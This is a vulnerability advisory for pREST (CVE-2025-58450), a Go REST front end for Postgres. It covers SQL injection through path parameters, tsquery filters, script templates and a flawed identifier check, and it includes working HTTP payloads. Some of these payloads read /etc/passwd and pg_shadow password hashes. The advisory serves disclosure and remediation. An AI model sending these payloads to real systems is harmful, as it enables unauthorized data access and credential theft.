# [C] pREST has a Systemic SQL Injection Vulnerability

## Summary
Severity: Critical
Advisory: GHSA-p46v-f2x8-qp98
CVE: CVE-2025-58450
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-09-08
Source: https://github.com/advisories/GHSA-p46v-f2x8-qp98
Type: github-advisory

## Affected
- Go: `github.com/prest/prest/v2` — affected >=0

## Details
# Summary
pREST provides a simple way for users to expose access their database via a REST-full API. The project is implemented using the Go programming language and is designed to expose access to Postgres database tables.

During an independent review of the project, Doyensec engineers found that SQL injection is a systemic problem in the current implementation (version `v2.0.0-rc2`). Even though there are several instances of attempts to sanitize user input and mitigate injection attempts, we have found that on most code-paths, the protection is faulty or non-existent.

## Core Endpoints
The main functionality providing REST operations on the data stored in the Postgres database is exposed via the following endpoints:
- `GET /{database}/{schema}/{table}` 
- `POST /{database}/{schema}/{table}` 
- `PUT|PATCH /{database}/{schema}/{table}` 
- `DELETE /{database}/{schema}/{table}` 

Handlers for the above endpoints execute very similar logic. At a high-level they:
1. Perform authentication and authorization
2. Build the SQL query based on the incoming request
3. Execute the query on the database
4. Return the data to the user

The query construction logic uses data from the request (e.g query, body or path parameters) and incorporates them in the SQL query.

As an example, let us look at the `GET` request or the read operation. After completing the authentication and authorization steps, the `SelectFromTables` function will first compile a list of all columns/fields, that will be returned in the HTTP response.
```go
cols, err := config.PrestConf.Adapter.FieldsPermissions(r, table, "read", userName)
// ---snip---
selectStr, err := config.PrestConf.Adapter.SelectFields(cols)
```

The `SelectFields` function will validate the requested columns using the `chkInvalidIdentifier` function, and will ultimately return the beginning of the generated SQL statement. Assuming the request specifies that only the `id` and `task` columns should be returned, the generated SQL will look something like:
```sql
SELECT "id", "task" FROM
```

The next step involves generating the table name, from which the data will be queried.
```go
query := config.PrestConf.Adapter.SelectSQL(selectStr, database, schema, table)
// ...
func (adapter *Postgres) SelectSQL(selectStr string, database string, schema string, table string) string {
	return fmt.Sprintf(`%s "%s"."%s"."%s"`, selectStr, database, schema, table)
}
```

The `SelectSQL` function will receive the `database`, `schema` and `table` values directly from the request and use them to construct the next part of the SQL statement using simple string concatenation.

If we assume that the `GET` request is made to the following path `/db001/api/todos`, the resulting query will look similar to:
```sql
SELECT "id", "name" FROM "api"."todos"
```

This step performs processing on values, specifically `schema` and `table`, which do not undergo any input validation, and ultimately allow for SQL injection.

---

The description above is only a single instance of this issue. The list below contains code paths that we believe is a comprehensive list of all code paths affected by this issue:
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L243
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L245
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L559
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L643
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1538
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1559
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1581
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1583
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1585
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1601
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1606
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1611
- https://github.com/prest/prest/blob/main/adapters/postgres/postgres.go#L1616
- https://github.com/prest/prest/blob/main/controllers/tables.go#L394
- https://github.com/prest/prest/blob/main/controllers/tables.go#L465
### Reproduction
The reproduction steps require a working environment which can be set up using the instructions below.

With that, the issue can be verified using the following HTTP request:
```http
GET /db001/api"."todos"%20where%20(select%201%20from%20pg_sleep(5))=1)%20s--/todos HTTP/1.1
Host: localhost:3000
```

The value provided as the `schema` path parameter contains the injection payload and contains SQL which will be added to the existing SQL statement and will inject a nested query that calls the `pg_sleep()` function, delaying the response by 5 seconds. The statement shown below will be the one that is ultimately executed on the database server.

```sql
SELECT * FROM "db001"."api"."todos" where (select 1 from pg_sleep(5))=1
```
## Missing Validation on tsquery Predicates
Users with permission to read data from tables have the ability to specify `tsquery` predicates, allowing them to perform more complex filtering on the data. An example usage of `tsquery` can be seen below:
```http
GET /databases?datname:tsquery=prest HTTP/1.1
Host: localhost:3000
```

pREST will parse the request, and if it detects that a `tsquery` needs to be generated, the following code will be executed:
```go
case "tsquery":
	tsQueryField := strings.Split(keyInfo[0], "$")
	tsQuery := fmt.Sprintf(`%s @@ to_tsquery('%s')`, tsQueryField[0], value)
	if len(tsQueryField) == 2 {
		tsQuery = fmt.Sprintf(`%s @@ to_tsquery('%s', '%s')`, tsQueryField[0], tsQueryField[1], value)
	}
	whereKey = append(whereKey, tsQuery)
```

In this example, the value of the `value` variable is used directly from the request without any validation, which ultimately allows another path to perform SQL injection.
### Reproduction
The reproduction steps require a working environment which can be set up using the instructions below.

With that, the issue can be verified using make the following HTTP request:
```http
GET /databases?datname:tsquery=db001')+and+((select+'1'+from+pg_sleep(5))%3d'1 HTTP/1.1
Host: localhost:3000
```

As with the previous example, the request above will use Postgres' `pg_sleep()` function to delay the response for 5 seconds, proving the injection was successful.
## Script Templates
pREST users can define templates for complex SQL queries, that can be reached using the `/_QUERIES/{queriesLocation}/{script}` endpoint. The scripts are read directly from the file system. Their content is passed to the `text/template` Go library, which will render any dynamic data, sourced from the request, directly on to the script template and return the result.
```go
func ExecuteScriptQuery(rq *http.Request, queriesPath string, script string) ([]byte, error) {
	config.PrestConf.Adapter.SetDatabase(config.PrestConf.PGDatabase)
	sqlPath, err := config.PrestConf.Adapter.GetScript(rq.Method, queriesPath, script)
	//---snip---
	templateData := make(map[string]interface{})
	extractHeaders(rq, templateData)
	extractQueryParameters(rq, templateData)
	sql, values, err := config.PrestConf.Adapter.ParseScript(sqlPath, templateData)
	//---snip---
	sc := config.PrestConf.Adapter.ExecuteScriptsCtx(rq.Context(), rq.Method, sql, values)
	//---snip---
	return sc.Bytes(), nil
}

//...

func (adapter *Postgres) ParseScript(scriptPath string, templateData map[string]interface{}) (sqlQuery string, values []interface{}, err error) {
	_, tplName := filepath.Split(scriptPath)

	funcs := &template.FuncRegistry{TemplateData: templateData}
	tpl := gotemplate.New(tplName).Funcs(funcs.RegistryAllFuncs())

	tpl, err = tpl.ParseFiles(scriptPath)
	//---snip---

	var buff bytes.Buffer
	err = tpl.Execute(&buff, funcs.TemplateData)
	//---snip---
	
	sqlQuery = buff.String()
	return
}
```

The `text/template` library is used to render pure text and does not implement any validation or sanitization functionality out-of-the-box. This allows for yet another path from SQL injection.
### Reproduction
The reproduction steps require a working environment which can be set up using the instructions below. In addition, the script below should be saved under the `{{project_root}}/_active` path as `get_todo.read.sql`. 
```sql
SELECT * FROM api.todos WHERE id = {{.todo_id}}
```

Before running pREST, make sure the configuration specifies the script template's directory on the root of the project.
```toml
[queries]
location = ""
```

With that, the issue can be verified by simply making the following request:
```http
GET /_QUERIES/_active/get_todo?todo_id=2%20or%20true HTTP/1.1
Host: localhost:3000
```

The `todo_id` value contains the value: `2 OR true` in percent-encoded format. This value will be interpolated in the template and result in the following query being executed:
```sql
SELECT * FROM api.todos WHERE id = 2 or true
```
This will ultimately return all values in from the target table.
## Issues with the Current Validation
pREST implements input validation via the `chkInvalidIdentifier` function, with an attempt to mitigate potential SQL injection attacks. The function will verify that a supplied variable contains only characters from a pre-defined allow list. In addition, the performed validation makes sure that the number of double quotes (`"`) in the validated value are divisible by 2, with the goal of preventing the user to escape the context of a Postgres identifier. 

The quotation validation logic ultimately proves to be faulty, and can also be abused to perform injection attacks. Namely, Postgres' SQL parser allows identifiers to be enclosed in double-quotes, which acts as a soft of field separator. This enables the construction of queries without any spaces. Combined with the set of allowed characters by the `chkInvalidIdentifier` function, the following request can be made to the server:
```http
GET /db001/api/todos?id"in(0)or(select"id"from"api.todos"where"id"in(1))in(1)or"id=1 HTTP/1.1
Host: localhost:3000
```

The request will ultimately execute the following SQL query:
```sql
SELECT jsonb_agg(s) FROM (SELECT * FROM "db001"."api"."todos" WHERE "id"in(0)or(select"id"from"api"."todos"where"id"in(1))in(1)or"id" = $1 ) s
```

The nested `SELECT` statement will impact the output returned to the user. If the nested query evaluates to `true`, the user will see all entries in the `todos` table. On the other hand, if the nested query evaluates to `false`, the user will only see the entry with its `id` column set to `1`.

This injection path is ultimately limited by the validation preformed in `chkInvalidIdentifier`, which limits the size of identifiers to 62 characters.
```go
if !strings.Contains(ival, ".") && len(ival) > 63 {
	return true
}
```
# Impact
**Critical**. Executing arbitrary commands on the database can allow for unauthorized access and modification of the data stored. Additionally, feature-rich database engines such as Postgres allow access to files stored on the underlining file-system, and may even allow for arbitrary command execution.

In pREST's case, the query generation procedure will invoke the `Prepare` function from the `sqlx` ORM, which prevents using stacked queries, also preventing execution of arbitrary operations.

However, nested queries and file access operations can be performed. The request shown below will read and return the contents of the `/etc/passwd` file.
```http
GET /db001/api"."todos"%20union%20select%20pg_read_file(chr(47)||'etc'||chr(47)||'passwd'))%20s--/todos?_select=task HTTP/1.1
Host: localhost:3000
```

Note that using forward slashes (`/`) will brake the path parsing performed by the API server. That limitation can be bypassed by specifying the forward slash using `CHR(47)`. This technique can be used to read environment variables, which often contain sensitive information such as API keys, or read other sensitive files such as SSH private keys or Postgres-specific certificates used for host-based authentication.

Nested queries can be used to access information from internal Postgres tables. The example below will retrieve the password hash of the current Postgres user.
```http
GET /db001/api"."todos"%20union%20select%20passwd%20from%20pg_shadow)%20s--/todos?_select=task HTTP/1.1
Host: localhost:3000
```

Finally, the pREST's official [Docker container ](https://hub.docker.com/r/prest/prest/) uses with the `prest` user the database to establish the database connection. This user does have "superuser" permissions, which increases the likelihood of users running pREST with overly permissioned database users which in turn exposes them to the attacks described above.

# Complexity
**Low**. With access to a running instance, basic web application security knowledge is required to find and exploit this issue. Furthermore, the pREST project is open source, removing any guess work that a potentially attacker might need to do if they were attacking an unknown system.

# Remediation
The injection proved to be systemic and impacts the majority of the exposed endpoint. We recommend overhauling how dynamic query generation is implemented. Unfortunately, the used `sqlx` library does not appear allow database identifiers to be parametrized, which is a core feature of pREST. This means that validation needs to be perform manually.

Start off by preventing all string concatenation operations that use unvalidated or unsanitized user input. All user-controllable values that represent database identifiers (e.g. database and table names) should only contain alpha-numeric characters and optionally dashed (`-`) and underscores (`_`).

Also consider removing the double-quote from the list of allowed character when performing validation and make sure they are placed in the correct position on the server-side. This will prevent the limited injection mentioned above.

Finally, consider updating how query scripts are created and processed. One way of doing this is by recommending the users to write scripts in a parametrized form. pREST can then read the script from the disk and build a parametrized query using `sqlx`. Any dynamic parameters can be read from the request object and set on the query object. In this implementation, escaping user-controlled values will be handled by the library itself. 

It is worth noting that the injection issue was pointed out by [GHSA-wm25-j4gw-6vr3](https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3). However, the submitter did not highlight the impact which is likely why the issue was left unpatched.

# Reproduction Environment Setup
The base environment used to verify the existence of the vulnerability uses a running instance of the deploying the official pREST [Docker container](https://hub.docker.com/r/prest/prest/). For simplicity, all reproduction steps assume that JWT-based authentication is disabled.

The database contains one table under the `api` namespace, named `todos` with the following schema:
```sql
CREATE TABLE api.todos (
  id int primary key generated by default as identity,
  done boolean not null default false,
  task text not null,
  due timestamptz
);
```

pREST can be ran using the following configuration:
```toml
debug = true

[http]
port = 3000

[jwt]
key = "secret"
algo = "HS256"

[auth]
enabled = false
type = "body"
encrypt = "MD5"
table = "prest_users"
username = "username"
password = "password"

[pg]
host = "127.0.0.1"
user = "prest"
pass = "password"
port = 5432
database = "db001"
single = true

[ssl]
mode = "disable"
sslcert = "./PATH"
sslkey = "./PATH"
sslrootcert = "./PATH"

[expose]
enabled = true
databases = true
schemas = true
tables = true

[queries]
location = ""
```

## References
- https://github.com/prest/prest/security/advisories/GHSA-p46v-f2x8-qp98
- https://nvd.nist.gov/vuln/detail/CVE-2025-58450
- https://github.com/prest/prest/commit/47d02b87842900f77d76fc694d9aa7e983b0711c
- https://github.com/prest/prest
